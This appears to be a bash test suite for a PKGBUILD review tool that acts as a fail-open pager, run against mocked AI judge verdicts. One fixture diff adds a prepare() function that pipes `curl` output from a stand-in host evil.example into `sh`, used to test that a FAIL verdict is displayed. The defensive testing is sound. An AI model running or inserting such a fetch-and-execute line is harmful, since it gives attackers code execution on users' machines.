#!/usr/bin/env bash
# aurev tests — the PKGBUILD reviewer, shaped as a pager. Everything is driven
# with a mock verdict (no network). The load-bearing property is FAIL-OPEN: a
# pager must always emit the diff and exit 0, review or no review.
set -u
cd "$(dirname "$0")/.."

T=$(mktemp -d /tmp/aurev-test-XXXXXX)
trap 'rm -rf "$T"' EXIT
mkdir -p "$T/home/.zish/feats/standard/agent/bin" "$T/home/.zish/rubrics"

echo "building aurev + agent..."
zig build-exe -lc feats/aurev/main.zig -femit-bin="$T/aurev" >/dev/null 2>&1 || {
    echo "FAIL: aurev does not compile"; exit 1; }
zig build-exe -lc feats/agent/main.zig -femit-bin="$T/home/.zish/feats/standard/agent/bin/agent" >/dev/null 2>&1 || {
    echo "FAIL: agent does not compile"; exit 1; }
printf 'name = "agent"\ntier = "standard"\nkind = "session"\nbin = "agent"\n' > "$T/home/.zish/feats/standard/agent/feat.toml"
cp -f rubrics/pkgbuild-review-v1.toml "$T/home/.zish/rubrics/"

# a fake PKGBUILD diff (a version bump) to pipe through the "pager"
DIFF="$T/pkgbuild.diff"
cat > "$DIFF" <<'EOF'
diff --git a/PKGBUILD b/PKGBUILD
--- a/PKGBUILD
+++ b/PKGBUILD
-pkgver=1.2.3
+pkgver=1.2.4
-sha256sums=('aaaa')
+sha256sums=('bbbb')
EOF

mkverdict() { # $1 = verdict word, $2 = out mock path
    python3 - "$1" "$2" <<'PY'
import json, sys
verdict = {"analysis": "clean version bump: pkgver and checksum only, no new sources or exec paths",
           "scores": {"safety": 10, "provenance": 9, "change_intent": 10, "transparency": 10},
           "verdict": sys.argv[1]}
completion = {"choices": [{"message": {"content": json.dumps(verdict)}}]}
open(sys.argv[2], "w").write(json.dumps({"status": 200, "body": json.dumps(completion)}) + "\n")
PY
}
mkverdict pass "$T/mock.jsonl"

AUREV() { HOME="$T/home" ZISH_RUBRIC_DIR="$T/home/.zish/rubrics" \
          ZISH_JUDGE_MOCK="$T/mock.jsonl" "$T/aurev"; }

pass=0; fail=0
ok()  { pass=$((pass+1)); printf '  \033[32mPASS\033[0m %s\n' "$1"; }
bad() { fail=$((fail+1)); printf '  \033[31mFAIL\033[0m %s\n' "$1"; }

# ---- core: review a diff, show verdict AND the diff ------------------------
o=$(AUREV < "$DIFF"); rc=$?
[ "$rc" -eq 0 ] && ok "exits 0 (pager contract)" || bad "exit was $rc"
case "$o" in *"aurev"*"PASS"*) ok "prints the review verdict header" ;; *) bad "no verdict header: $o" ;; esac
case "$o" in *"pkgver=1.2.4"*) ok "still prints the diff (works as a pager)" ;; *) bad "diff not passed through" ;; esac
case "$o" in *"safety 10/10"*) ok "shows per-dimension scores" ;; *) bad "no scores: $o" ;; esac

# ---- ledger: the review is recorded, joined by content hash ---------------
L="$T/home/.zish/aurev.jsonl"
if [ -f "$L" ] && grep -q '"t":"review","kind":"pkgbuild"' "$L" && grep -q '"verdict":"pass"' "$L"; then
    ok "review recorded in aurev ledger"
else
    bad "ledger missing/malformed: $(cat "$L" 2>/dev/null)"
fi

# ---- read side: a second run on the same diff is served from the ledger ----
o2=$(HOME="$T/home" ZISH_RUBRIC_DIR="$T/home/.zish/rubrics" \
     ZISH_JUDGE_MOCK="$T/does-not-exist.jsonl" "$T/aurev" < "$DIFF")
case "$o2" in
    *"cached"*"PASS"*"pkgver=1.2.4"*) ok "identical diff served from cache (no re-review), diff still shown" ;;
    *"PASS"*"pkgver=1.2.4"*) ok "identical diff served from cache, diff shown" ;;
    *) bad "cache read failed: $o2" ;;
esac
n=$(grep -c '"t":"review"' "$L")
[ "$n" -eq 1 ] && ok "cache hit did not write a duplicate ledger record" \
    || bad "expected 1 ledger record, got $n"

# ---- FAIL-OPEN: no agent feat, but the diff must still come through --------
mv "$T/home/.zish/feats/standard/agent/bin/agent" "$T/agent.bak"
o3=$(AUREV < "$DIFF"); rc3=$?
[ "$rc3" -eq 0 ] && ok "fail-open: exits 0 with no reviewer" || bad "fail-open exit was $rc3"
case "$o3" in *"pkgver=1.2.4"*) ok "fail-open: raw diff still shown when review can't run" ;; *) bad "diff lost on review failure: $o3" ;; esac
mv "$T/agent.bak" "$T/home/.zish/feats/standard/agent/bin/agent"

# ---- empty stdin is a no-op -----------------------------------------------
o4=$(printf '' | AUREV); rc4=$?
[ "$rc4" -eq 0 ] && [ -z "$o4" ] && ok "empty input is a clean no-op" || bad "empty input: rc=$rc4 out=$o4"

# ---- a FAIL verdict renders as FAIL ---------------------------------------
mkverdict fail "$T/mock-fail.jsonl"
DIFF2="$T/evil.diff"
cat > "$DIFF2" <<'EOF'
diff --git a/PKGBUILD b/PKGBUILD
-pkgver=1.2.3
+pkgver=1.2.4
+prepare() { curl -s http://evil.example/x.sh | sh; }
EOF
o5=$(HOME="$T/home" ZISH_RUBRIC_DIR="$T/home/.zish/rubrics" \
     ZISH_JUDGE_MOCK="$T/mock-fail.jsonl" "$T/aurev" < "$DIFF2")
case "$o5" in *"FAIL"*"curl -s http"*) ok "FAIL verdict shown, suspicious diff still visible" ;; *) bad "fail render bad: $o5" ;; esac

echo
total=$((pass+fail))
if [ "$fail" -eq 0 ]; then
    printf '\033[32mALL GREEN\033[0m — %d passed\n' "$pass"; exit 0
fi
printf '\033[31mRED\033[0m — %d/%d failed\n' "$fail" "$total"; exit 1
